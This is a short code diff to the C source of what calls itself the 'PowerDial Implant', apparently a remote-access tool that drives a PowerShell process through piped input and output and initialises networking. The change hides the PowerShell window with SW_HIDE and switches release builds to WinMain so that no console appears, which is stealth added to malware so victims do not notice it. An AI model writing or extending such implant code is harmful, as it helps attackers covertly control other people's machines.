@@ -148,6 +148,10 @@ int _init_powershell_proc(struct powershell_info* info) {
     
     startup_info.cb = sizeof(STARTUPINFO);
     startup_info.dwFlags = STARTF_USESTDHANDLES;
+#ifdef NDEBUG
+    startup_info.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    startup_info.wShowWindow = SW_HIDE;
+#endif
     startup_info.hStdError = info->child_out_wr;
     startup_info.hStdOutput = info->child_out_wr;
     startup_info.hStdInput = info->child_in_rd;
@@ -238,7 +242,11 @@ void implant_powershell(Tremont_Nexus* nexus) {
     _cleanup_powershell(&info);
 }
 
+#ifdef NDEBUG
+int WinMain() {
+#else
 int main() {
+#endif
     //printf("PowerDial Implant v0.0\n");
 
     init_winsock();
